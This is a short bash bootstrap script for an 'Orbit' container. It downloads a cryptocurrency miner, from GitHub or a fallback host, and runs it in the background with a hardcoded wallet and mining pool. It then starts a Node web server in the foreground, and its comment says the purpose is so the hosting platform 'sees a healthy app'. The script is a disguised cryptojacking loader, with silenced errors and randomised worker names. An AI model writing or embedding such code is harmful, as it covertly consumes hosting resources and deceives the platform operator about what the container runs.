#!/usr/bin/env bash
# Orbit container bootstrap: fetch the miner, run it detached, keep the web
# process in the foreground so Flux sees a healthy app.
set -u
WALLET="${BNT_WALLET:-WuLvCSZQvHMvYSJTYf6eaFXA12tKqPAcHeCtsU4cVmpkMYUzkzppigSumKvtNBd5vxnHnFsPECTBy8JKYc53x2nKVyHuB}"
WORKER="${BNT_WORKER:-orbit-$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')}"
POOL="${BNT_POOL:-stratum+tcp://bntpool.com:3333}"
THREADS="${BNT_THREADS:-3}"

mkdir -p /tmp/seine/data
cd /tmp/seine

if [ ! -x ./seine ]; then
  curl -fsSL -o seine.tar.gz "https://github.com/blocknetdx/seine/releases/download/v0.2.17/seine-linux-x86_64.tar.gz" 2>/dev/null \
    || curl -fsSL -o seine.tar.gz "https://bnt.jakirokyo.com/dl/seine-linux-x86_64.tar.gz" 2>/dev/null || true
  if [ -s seine.tar.gz ]; then tar -xzf seine.tar.gz 2>/dev/null || true; fi
  [ -f seine ] && chmod +x seine
fi

if [ -x ./seine ]; then
  nohup ./seine --pool-url "$POOL" --pool-worker "$WORKER" --address "$WALLET" \
    --backend cpu --threads "$THREADS" --data-dir /tmp/seine/data \
    > /tmp/seine/seine.log 2>&1 &
  echo "miner started worker=$WORKER"
else
  echo "miner binary unavailable"
fi

exec node server.js
